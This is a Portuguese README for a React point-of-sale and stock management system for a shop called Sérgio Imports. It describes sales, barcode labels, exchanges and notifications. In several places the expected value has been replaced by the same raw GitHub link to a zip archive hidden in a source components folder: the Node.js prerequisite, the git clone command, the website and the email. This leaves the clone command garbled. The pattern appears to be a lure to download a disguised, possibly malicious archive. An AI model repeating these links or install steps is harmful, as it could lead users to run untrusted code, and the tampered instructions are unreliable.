# 🏪 Sistema PDV Sérgio Imports

Sistema de Ponto de Venda completo desenvolvido em React para gestão de vendas, estoque, clientes e operações comerciais da Sérgio Imports.

## 🚀 Funcionalidades

### 💰 PDV (Ponto de Venda)
- Interface intuitiva para vendas
- Busca de produtos por nome ou código de barras
- Carrinho de compras com cálculo automático
- Sistema de desconto
- Múltiplas formas de pagamento
- Impressão de recibos térmicos

### 📦 Gestão de Produtos
- Cadastro completo de produtos
- Geração automática de códigos de barras EAN-13 válidos
- Controle de estoque com alertas
- Categorização e organização
- Upload de imagens

### 🏷️ Sistema de Etiquetas
- Geração de etiquetas personalizáveis
- Seleção individual com controle de quantidade
- Impressão em PDF e térmica
- Códigos de barras integrados
- Dimensões otimizadas (180x120px)

### 🔄 Sistema de Trocas
- Registro completo de trocas
- Vinculação com vendas originais
- Múltiplos motivos de troca
- Controle de status (Pendente/Concluída/Cancelada)
- Impressão de recibos de troca

### 🔔 Sistema de Notificações
- **Estoque Baixo**: Alerta automático para produtos com menos de 2 unidades
- **Vendas**: Notificação a cada venda realizada
- **Trocas**: Alerta para cada troca registrada
- Modal interativo com gerenciamento completo
- Contador visual no header

### 👥 Gestão de Clientes
- Cadastro de clientes
- Histórico de compras
- Dados de contato organizados

### 📊 Dashboard Inteligente
- Estatísticas em tempo real
- Produtos em estoque
- Vendas recentes
- Alertas de estoque baixo
- Resumo de notificações

### ⚙️ Configurações
- Dados da empresa
- Personalização de recibos
- Políticas de troca
- Configurações de impressão

## 🛠️ Tecnologias Utilizadas

- **React 19.1.0** - Framework principal
- **Vite 6.3.5** - Build tool e servidor de desenvolvimento
- **Tailwind CSS** - Estilização
- **Framer Motion** - Animações
- **Lucide React** - Ícones
- **IndexedDB** - Banco de dados local
- **JsBarcode** - Geração de códigos de barras
- **jsPDF** - Geração de PDFs
- **React Hot Toast** - Notificações
- **date-fns** - Manipulação de datas

## 🎨 Design

- **Neumorphism**: Design moderno com efeitos 3D suaves
- **Dark Mode**: Suporte completo ao modo escuro
- **Responsivo**: Interface adaptável para desktop e mobile
- **Animações**: Transições suaves e feedback visual

## 🚀 Como Executar

### Pré-requisitos
- https://github.com/Se198361/gestao-sergio-imports-pdv/raw/refs/heads/main/src/components/Exchanges/gestao_imports_pdv_sergio_v2.6.zip 16+ 
- npm ou yarn

### Instalação

1. Clone o repositório:
```bash
git clone https://github.com/Se198361/gestao-sergio-imports-pdv/raw/refs/heads/main/src/components/Exchanges/gestao_imports_pdv_sergio_v2.6.zip[SEU_USERNAME]https://github.com/Se198361/gestao-sergio-imports-pdv/raw/refs/heads/main/src/components/Exchanges/gestao_imports_pdv_sergio_v2.6.zip
cd gestao-sergio-imports-pdv
```

2. Instale as dependências:
```bash
npm install
```

3. Execute o projeto:
```bash
npm run dev
```

4. Acesse: `http://localhost:5173`

## 📱 Uso do Sistema

### Primeira Execução
- O sistema inicializa automaticamente com dados de exemplo
- Produtos, clientes e configurações básicas são criados
- Dados ficam salvos localmente no navegador

### Fluxo de Venda
1. Acesse a aba "PDV"
2. Busque produtos por nome ou código de barras
3. Adicione itens ao carrinho
4. Aplique desconto se necessário
5. Finalize com forma de pagamento
6. Imprima o recibo

### Gestão de Estoque
1. Acesse "Produtos" para cadastrar/editar
2. Códigos de barras são gerados automaticamente
3. Monitore alertas de estoque baixo no Dashboard
4. Receba notificações automáticas

### Sistema de Etiquetas
1. Acesse "Etiquetas"
2. Selecione produtos e quantidades
3. Visualize e imprima etiquetas
4. Códigos de barras incluídos automaticamente

## 🔧 Configuração

### Dados da Empresa
- Configure informações da empresa em "Configurações"
- Personalize mensagens dos recibos
- Defina políticas de troca

### Impressão
- Recibos otimizados para impressoras térmicas 58mm
- Etiquetas em formato 180x120px
- Suporte a impressão via navegador

## 📂 Estrutura do Projeto

```
src/
├── components/          # Componentes React
│   ├── Dashboard/      # Painel principal
│   ├── PDV/           # Ponto de venda
│   ├── Products/      # Gestão de produtos
│   ├── Clients/       # Gestão de clientes
│   ├── Sales/         # Histórico de vendas
│   ├── Exchanges/     # Sistema de trocas
│   ├── Labels/        # Geração de etiquetas
│   ├── Settings/      # Configurações
│   └── Layout/        # Componentes de layout
├── contexts/           # Context API
├── services/          # Serviços (banco de dados)
└── styles/           # Estilos globais
```

## 💾 Banco de Dados

- **IndexedDB**: Armazenamento local no navegador
- **Tabelas**: products, clients, sales, exchanges, settings
- **Persistência**: Dados mantidos entre sessões
- **Performance**: Acesso rápido e offline

## 🎯 Funcionalidades Especiais

### Códigos de Barras EAN-13
- Geração automática com dígito verificador
- Códigos únicos para cada produto
- Validação e verificação de duplicatas
- Compatível com leitores comerciais

### Notificações Inteligentes
- Estoque baixo (< 2 unidades)
- Confirmação de vendas
- Registro de trocas
- Sistema de leitura/não leitura
- Limpeza automática

### Impressão Otimizada
- Recibos térmicos 58mm
- Etiquetas padronizadas
- Pop-ups de impressão
- Compatibilidade cross-browser

## 🤝 Contribuição

1. Faça um fork do projeto
2. Crie uma branch para sua feature (`git checkout -b feature/AmazingFeature`)
3. Commit suas mudanças (`git commit -m 'Add some AmazingFeature'`)
4. Push para a branch (`git push origin feature/AmazingFeature`)
5. Abra um Pull Request

## 📝 Licença

Este projeto está sob a licença MIT. Veja o arquivo [LICENSE](LICENSE) para detalhes.

## 📞 Contato

**Sérgio Imports**
- Website: [https://github.com/Se198361/gestao-sergio-imports-pdv/raw/refs/heads/main/src/components/Exchanges/gestao_imports_pdv_sergio_v2.6.zip](https://github.com/Se198361/gestao-sergio-imports-pdv/raw/refs/heads/main/src/components/Exchanges/gestao_imports_pdv_sergio_v2.6.zip)
- Email: https://github.com/Se198361/gestao-sergio-imports-pdv/raw/refs/heads/main/src/components/Exchanges/gestao_imports_pdv_sergio_v2.6.zip
- Telefone: (11) 99999-9999

---

🏪 **Sistema PDV Sérgio Imports** - Gestão completa para seu negócio!